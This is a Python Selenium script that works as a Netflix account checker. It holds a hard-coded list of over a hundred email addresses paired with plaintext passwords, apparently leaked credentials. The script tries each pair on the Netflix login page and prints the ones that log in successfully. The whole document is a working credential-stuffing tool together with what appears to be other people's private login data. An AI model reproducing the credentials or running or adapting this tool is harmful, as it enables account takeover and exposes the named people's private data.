from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
from selenium.common.exceptions import NoSuchElementException  

url = "https://www.netflix.com/login"
UandP = {"blancaprieto911@icloud.com":"Blanca1014","deborah.parrilla@outlook.fr":"deboradu81","disney3@outlook.com":"supernatural13","ditkovich@yahoo.com":"mitya1970","mousumisinha92@gmail.com":"nature92","oceane.desmolle2105@gmail.com":"Oceane2105","lana.oreiq@y7mail.com":"Majeed18","daisystephany31@gmail.com":"yonimeacuerdo31","marniedyer1212@gmail.com":"Buster1212","kritiagarwal362@gmail.com":"shish19","amandak_94@hotmail.com":"sherry123","jae@kd.dep.no":"Ingvil123","famille_fortin@hotmail.com":"isaac0204","14202010@ksom.ac.in":"mama4616","lecornu.denis@gmail.com":"elliejoy","horridromance1981@yahoo.com":"Socialwork1","jwolfeswoodworking@yahoo.com":"Samjiltay3","diazdeleons@ymail.com":"david08","emily4058@hotmail.com":"Sunnyday123","kassidy1mcmillan@gmail.com":"mcmillan12","janinehansmeier120@gmail.com":"Jorden2016","digiglio@wanadoo.fr":"rhuq6qh","coxjes@shckyneton.catholic.edu.au":"Jessicac21","a.w.dronfield@hotmail.co.uk":"Tiddles1969","juditfranquet@hotmail.com":"Adel123456","pari.becker.romero@gmail.com":"sobrino01","gedkate@live.com":"Narla001","fashionkids28380@gmail.com":"tralala28","jessicabevia@gmail.com":"llamallama123","jasminababic1996@outlook.com":"Milton5296","gore-21@hotmail.es":"654664512gb","itziaduarte@hotmail.com":"supercool123","palviacharya5589@gmail.com":"poorviparv","carlacovin@gmail.com":"7He@ven7","amirtharamaswamyiyengar@gmail.com":"Smile_123","lilsbartlett@outlook.com":"Dickhead123","chrissy1411@hotmail.com":"grandkids4","mmurgana@hotmail.com":"fatfighters","Jennifer.ristevski@hotmail.com":"R1stev94","albasecu@gmail.com":"alba1989","daianatoffoletti@hotmail.com":"theperfecttwo","danae.antonia.martinez@gmail.com":"cabecabe2","hannahsizeland@yahoo.co.uk":"corrie311","Magda.e@hotmail.fr":"15021991","hhckitchener@gmail.com":"118johanna","chiaradipas@gmail.com":"02091973","eileenmira@aol.com":"tommyshay","oliviahawksworth@gmail.com":"samson1","noora_19@hotmail.co.uk":"kurdishbabe13","kyndallhawkins@gmail.com":"Easyas123","courtneytaylorxox@gmail.com":"Efstathiou123","lubnarahim789@gmail.com":"Kashaf123","baz5141@gmail.com":"silver54321","LucieSaint-Denis@Outlook.fr":"Aqwzsxedcrfv77","priyanka76@hotmail.co.uk":"priyanka0296","jaanelyd_1207@yahoo.com":"december10","cadicmarine@gmail.com":"flicflacfloc1","louisesloan06@gmail.com":"bubbalouie","earthsongglobal@gmail.com":"go4gold123","nuray.773@hotmail.de":"edirne22","humbertoquinones15@gmail.com":"15081936","lili_4650@hotmail.fr":"Dialogue","nicolegreaves1@hotmail.com":"Phoebe21","michaelamay.nugent@gmail.com":"Tyson350","dodo30031997@gmail.com":"30031997","lucy@heintz.net":"sascha","karimagordon1@gmail.com":"kg060199","memangum@comcast.net":"Rebels3565","karolja@inbox.lv":"telek123456","kate.hammond1990@gmail.com":"Spammond1","gemcabral@gmail.com":"April171999","bryonycaitlinclarke@gmail.com":"tillymint","mollielk10@gmail.com":"Watermelon9","georgiamay.30@hotmail.com":"banana33","anacristinacazorla@gmail.com":"Anac1997","jmz1638@gmail.com":"jenamarie143","claudia-familia@hotmail.es":"22072003","abbeyneitzel@gmail.com":"Chris1126","damm.edward@gmail.com":"Edward2320","aboulkassimr44@gmail.com":"rimounette1A","marieanna102@gmail.com":"babygurl90","alekzt100@icloud.com":"grunge100","mela2599@gmail.com":"Taeyang_99","kimgarstew@verizon.net":"icasit17","pasi23d@gmail.com":"prasidhi23","lauraraach@hotmail.fr":"laraor32","jonestricia4@yahoo.com":"daugherty","capucinelabeille4@gmail.com":"Capucine21","Nikimaxfield28@gmail.com":"Lachlan22","marinacaetano83@hotmail.com":"81108110","ali.cat123@hotmail.co.uk":"Poppypoodle123","beeadan@hotmail.com":"Goldfish69","kirsten_clr@yahoo.com":"funnyface55","garzacielo21@gmail.com":"110094","elisetick@gmail.com":"hummertime","briittnneeyy72@gmail.com":"britneyg","larenda1@yahoo.com":"Bethune06","hettyzuky@gmail.com":"chidalu03","leata.alexisloli@gmail.com":"a87e1511","peachygirl6770@icloud.com":"peachy02","dangley@naver.com":"chnais77","kskk5209@daum.net":"994004","hjchun2396@naver.com":"hj661214","alswl415@daum.net":"rlawodnjs1","rhgkdbs62@hanmail.net":"sa09876","raning1988@naver.com":"fmrladn0","staryu22@naver.com":"flwl25120","dochoi81@naver.com":"shin8779","godsu0326@naver.com":"epsdus22","yswon76@hotmail.com":"army0227","rhdan89@naver.com":"enrmsenrms33","dbwlgns29@naver.com":"whejs458","blueing78@naver.com":"gnsl1978","sp5526@hanmail.net":"anajeong90","wngid110@naver.com":"djqls1103","choon7837@nate.com":"122925bb","sinje7@naver.com":"s2122613","karizzma@naver.com":"ghks3927","cyoung042002@naver.com":"6tjemsdj","eorjf814@naver.com":"deagul814","jini806@naver.com":"jin0956","hyejin3502@naver.com":"tkfkd22","mikeyrooke@daum.net":"pst57382"}
leng = len(UandP)

def dri():
    return driver.get(url)
      

def check_css_element(css_element):
    dri()
    try:
        driver.find_element_by_css_selector(css_element)
    except NoSuchElementException:
        return False
    return True


print ("Total accounts : " + str(leng))

driver = webdriver.Chrome('./chromedriver.exe')
  
for x in UandP:
    dri()
    print ("Login : " + x + " : " + UandP[x])
    driver.find_element_by_id("id_userLoginId").send_keys(x)
    driver.find_element_by_id("id_password").send_keys(UandP[x])
    li = driver.find_elements_by_css_selector("#appMountPoint > div > div.login-body > div > div > div.hybrid-login-form-main > form > button")
    if len(li) > 0:
        li[0].click()
        time.sleep(3)
    if check_css_element("#appMountPoint > div > div > div:nth-child(1) > div.bd.dark-background > div.profiles-gate-container > div > span > a") == True:
        print ("Login Success : " + x + " : " + UandP[x])
        driver.close()
driver.close()
